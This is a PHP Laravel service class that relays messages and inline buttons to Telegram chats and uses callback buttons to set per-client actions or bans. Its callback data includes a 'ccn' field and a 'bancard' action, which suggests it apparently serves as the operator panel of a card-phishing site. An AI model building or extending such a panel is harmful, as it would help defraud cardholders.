<?php

namespace App\Services;

use App\Helpers\UrlHelper;
use App\Models\Client;
use App\Models\Settings;
use Telegram\Bot\Api;
use Telegram\Bot\Exceptions\TelegramSDKException;
use Illuminate\Support\Facades\Log;

class TelegramService
{
    private Api $telegram;

    public function __construct(Api $telegram)
    {
        $this->telegram = $telegram;
    }

    private function getTokenChatId(): Settings
    {
        $settings = Settings::first();

        if (!$settings) {
            throw new \InvalidArgumentException('Settings not found.');
        }

        return $settings;
    }

    private function insertAction(string $userId, string $action): ?Client
    {
        if (empty($userId) || empty($action)) {
            Log::error("Invalid input: uniqueId or action is empty");
            return null;
        }

        //Log::info("Inserting action: $action for userId: $userId");

        try {
            $client = Client::where('unique_id', $userId)->first();

            if (!$client) {
                Log::warning("No client found with unique_id: $userId");
                return null;
            }

            switch ($action) {
                case 'ban':
                    $client->update(['ban' => true]);
                    break;
                case 'unban':
                    $client->update(['ban' => false]);
                    break;
                default:
                    if (!$client->update(['action' => $action, 'ban' => $client->ban])) {
                        Log::error("Failed to update action for client with unique_id: $userId.");
                        return null;
                    }
            }

            return $client;
        } catch (\Exception $e) {
            Log::error("Error in insertAction: " . $e->getMessage());
            return null;
        }
    }

    private function handleTelegramException(TelegramSDKException $e, string $context): void
    {
        Log::error("Telegram API Error in {$context}: " . $e->getMessage());
    }

    private function sendMessageToChat(string $message, ?string $chatType = 'chat_id'): ?array
    {
        $settings = $this->getTokenChatId();

        try {
            $telegram = new Api($settings->bot_token);
            $chatId = $chatType === 'chat_id_info' ? $settings->chat_id_info : $settings->chat_id;
            $response = $telegram->sendMessage([
                'chat_id' => $chatId,
                'text' => $message,
                'parse_mode' => 'HTML',
            ]);

            return $response->getRawResponse();
        } catch (TelegramSDKException $e) {
            $this->handleTelegramException($e, __METHOD__);
            return null;
        }
    }

    public function sendMessage(string $message): ?array
    {
        return $this->sendMessageToChat($message, 'chat_id');
    }

    public function sendMessageInfo(string $message): ?array
    {
        return $this->sendMessageToChat($message, 'chat_id_info');
    }

    private function sendMessageWithButtonsToChat(string $message, array $buttons, ?string $chatType = 'chat_id'): void
    {
        $settings = $this->getTokenChatId();

        
        try {
            $telegram = new Api($settings->bot_token);
            $chatId = $chatType === 'chat_id_info' ? $settings->chat_id_info : $settings->chat_id;
            $telegram->sendMessage([
                'chat_id' => $chatId,
                'text' => $message,
                'reply_markup' => json_encode(['inline_keyboard' => $buttons]),
                'parse_mode' => 'HTML',
            ]);

            //Log::info("Message sent with buttons to chat {$chatId}: " . $info->getMessageId());
        } catch (TelegramSDKException $e) {
            $this->handleTelegramException($e, __METHOD__);
        }
    }

    public function sendMessageWithButtons(string $message, array $buttons): void
    {
        $this->sendMessageWithButtonsToChat($message, $buttons, 'chat_id');
    }

    public function sendMessageWithButtonsInfo(string $message, array $buttons): void
    {
        $this->sendMessageWithButtonsToChat($message, $buttons, 'chat_id_info');
    }

    public function ensureWebhook(string $webhookUrl): bool
    {
        try {
            $webhookInfo = $this->telegram->getWebhookInfo();

        if (empty($webhookInfo->getUrl()) || $webhookInfo->getUrl() !== $webhookUrl) {
            $this->telegram->setWebhook(['url' => $webhookUrl]);
            return true;
        }
    } catch (TelegramSDKException $e) {
        $this->handleTelegramException($e, __METHOD__);
    }

    return false;
}

    public function handleCallbackAndNotify(array $callbackQuery): void
    {
        if (!isset($callbackQuery['data'], $callbackQuery['from'], $callbackQuery['message'])) {
            Log::warning("Malformed callback query: " . json_encode($callbackQuery));
            return;
        }

        $data = $callbackQuery['data'];
        $parts = explode(':', $data);

        if (count($parts) < 2) {
            Log::warning("Invalid callback data: $data");
            return;
        }

        [$uniqueId, $action, $ccn] = array_pad($parts, 3, null);
        $username = $callbackQuery['from']['username'] ?? 'Unknown';
        $chatId = $callbackQuery['message']['chat']['id'];
        $messageId = $callbackQuery['message']['message_id'];
        $callbackQueryId = $callbackQuery['id'];

        try {

            $client = $this->insertAction($uniqueId, $action);

            if (!$client) {
                return;
            }

            $settings = Settings::first();

            $telegram = new Api($settings->bot_token);

            if ($action !== 'bancard') {
            $telegram->editMessageReplyMarkup([
                'chat_id' => $chatId,
                'message_id' => $messageId,
                'reply_markup' => json_encode(['inline_keyboard' => []]),
            ]);
            }

            $telegram->answerCallbackQuery([
                'callback_query_id' => $callbackQueryId,
                'text' => "Action received: " . strtoupper($action),
            ]);

            $text = "🆔 <i>@$username</i> Action: <b>" . strtoupper($action) . "</b>\n  ↳ <code>{$uniqueId}</code>";
            $response = $telegram->sendMessage([
                'chat_id' => $this->getTokenChatId()->chat_id,
                'text' => $text,
                'parse_mode' => 'HTML',
            ]);

            // sleep(5);
            // $telegram->deleteMessage([
            //     'chat_id' => $this->getTokenChatId()->chat_id,
            //     'message_id' => $response->getMessageId(),
            // ]);


        } catch (\Exception $e) {
            Log::error("Error in handleCallbackAndNotify: " . $e->getMessage());
        }
    }

    public function setWebhook(string $botToken): bool
    {
        $telegram = new Api($botToken);
        $webhookUrl = UrlHelper::getWebhookUrl("api/webhook/{$botToken}");
        //Log::info("Url for webhook: " . $webhookUrl);
        try {
            $telegram->setWebhook(['url' => $webhookUrl]);
            return true;
        } catch (TelegramSDKException $e) {
            $this->handleTelegramException($e, __METHOD__);
            return false;
        }
    }

    /**
     * Test if the bot token is valid by calling getMe API
     * This method creates a temporary API instance with the provided token
     */
    public function testBot(string $botToken): bool
    {
        try {
            // Create a temporary API instance with the provided token
            $tempTelegram = new Api($botToken);
            
            // Call getMe to test if the bot token is valid
            $response = $tempTelegram->getMe();
            
            // If we get here without exception, the bot token is valid
            //Log::info("Bot test successful for token: " . substr($botToken, 0, 10) . "...");
            return true;
            
        } catch (TelegramSDKException $e) {
            Log::error("Bot test failed for token: " . substr($botToken, 0, 10) . "... Error: " . $e->getMessage());
            return false;
        } catch (\Exception $e) {
            Log::error("Unexpected error during bot test: " . $e->getMessage());
            return false;
        }
    }

    /**
     * Get bot information using the provided token
     */
    public function getBotInfo(string $botToken): ?array
    {
        try {
            $tempTelegram = new Api($botToken);
            $response = $tempTelegram->getMe();
            
            return [
                'id' => $response->getId(),
                'is_bot' => $response->getIsBot(),
                'first_name' => $response->getFirstName(),
                'username' => $response->getUsername(),
                'can_join_groups' => $response->getCanJoinGroups(),
                'can_read_all_group_messages' => $response->getCanReadAllGroupMessages(),
                'supports_inline_queries' => $response->getSupportsInlineQueries(),
            ];
            
        } catch (TelegramSDKException $e) {
            $this->handleTelegramException($e, __METHOD__);
            return null;
        } catch (\Exception $e) {
            Log::error("Unexpected error getting bot info: " . $e->getMessage());
            return null;
        }
    }

    /**
     * Get webhook information using the provided bot token
     */
    public function getWebhookInfo(string $botToken): ?array
    {
        try {
            $tempTelegram = new Api($botToken);
            $response = $tempTelegram->getWebhookInfo();
            
            // Convert WebhookInfo object to array
            return [
                'url' => $response->getUrl(),
                'has_custom_certificate' => $response->getHasCustomCertificate(),
                'pending_update_count' => $response->getPendingUpdateCount(),
                'ip_address' => $response->getIpAddress(),
                'last_error_date' => $response->getLastErrorDate(),
                'last_error_message' => $response->getLastErrorMessage(),
                'last_synchronization_error_date' => $response->getLastSynchronizationErrorDate(),
                'max_connections' => $response->getMaxConnections(),
                'allowed_updates' => $response->getAllowedUpdates(),
            ];
        } catch (TelegramSDKException $e) {
            $this->handleTelegramException($e, __METHOD__);
            return null;
        } catch (\Exception $e) {
            Log::error("Unexpected error getting webhook info: " . $e->getMessage());
            return null;
        }
    }

    /**
     * Send a test message to verify chat ID is working
     */
    public function sendTestMessage(string $botToken, string $chatId, string $message = 'Test message from your bot!'): bool
    {
        try {
            $tempTelegram = new Api($botToken);
            
            $response = $tempTelegram->sendMessage([
                'chat_id' => $chatId,
                'text' => $message,
                'parse_mode' => 'HTML',
            ]);
            
            //Log::info("Test message sent successfully to chat: $chatId");
            return true;
            
        } catch (TelegramSDKException $e) {
            Log::error("Failed to send test message to chat $chatId: " . $e->getMessage());
            return false;
        } catch (\Exception $e) {
            Log::error("Unexpected error sending test message: " . $e->getMessage());
            return false;
        }
    }

    /**
     * Validate if a chat ID is accessible by the bot
     */
    public function validateChatId(string $botToken, string $chatId): bool
    {
        try {
            $tempTelegram = new Api($botToken);
            
            // Try to get chat information
            $response = $tempTelegram->getChat(['chat_id' => $chatId]);
            
            //Log::info("Chat ID validation successful for: $chatId");
            return true;
            
        } catch (TelegramSDKException $e) {
            Log::error("Chat ID validation failed for $chatId: " . $e->getMessage());
            return false;
        } catch (\Exception $e) {
            Log::error("Unexpected error validating chat ID: " . $e->getMessage());
            return false;
        }
    }

    /**
     * Remove webhook using the provided bot token
     */
    public function removeWebhook(string $botToken): bool
    {
        try {
            $tempTelegram = new Api($botToken);
            $tempTelegram->removeWebhook();
            
            //Log::info("Webhook removed successfully");
            return true;
            
        } catch (TelegramSDKException $e) {
            $this->handleTelegramException($e, __METHOD__);
            return false;
        }
    }
}
